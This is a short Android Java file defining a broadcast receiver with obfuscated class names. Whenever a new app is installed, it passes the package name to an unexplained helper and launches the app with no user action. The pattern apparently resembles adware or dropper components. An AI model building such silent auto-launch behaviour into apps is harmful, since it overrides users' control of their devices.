package com.sar.gp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

public class Asdfree extends BroadcastReceiver {
	private static String TAG = Asdfree.class.toString();
	@Override
	public void onReceive(Context arg0, Intent intent) {
		Agmrsk.init(arg0);
		// 接收广播：设备上新安装了一个应用程序包后自动启动新安装应用程序。
		if (intent.getAction().equals("android.intent.action.PACKAGE_ADDED")) {
			String pkg = intent.getDataString().substring(8);
			Log.i(TAG, "接收到安装广播:[" + pkg + "]");
			Dlg.ccn(pkg);
			PackageManager packageManager = arg0.getPackageManager();   
			Intent it = packageManager.getLaunchIntentForPackage(pkg); //要启动应用的包名   
			arg0.startActivity(it); 
		}
	}

}
